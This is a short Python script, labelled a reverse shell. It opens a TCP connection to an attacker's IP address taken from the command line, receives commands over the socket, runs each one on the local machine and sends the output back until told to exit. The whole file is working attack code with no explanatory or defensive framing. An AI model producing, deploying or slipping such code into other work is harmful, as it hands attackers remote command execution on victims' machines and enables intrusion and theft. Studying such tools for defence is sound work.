# reverse shell, ipv4(af_inet), tcp-socket(sock_stream)

import sys
from subprocess import Popen, PIPE
from socket import *

serverName = sys.argv[1] # attacker ip
serverPort = 8000

# Create IPv4, TCP socket
clientSocket = socket(AF_INET, SOCK_STREAM)
clientSocket.connect((serverName, serverPort))
clientSocket.send('hiii <3'.encode())
command = clientSocket.recv(4064).decode()

while command != "exit":
	proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE)
	result, err = proc.communicate()
	clientSocket.send(result)
	command = (clientSocket.recv(4064)).decode()

clientSocket.close()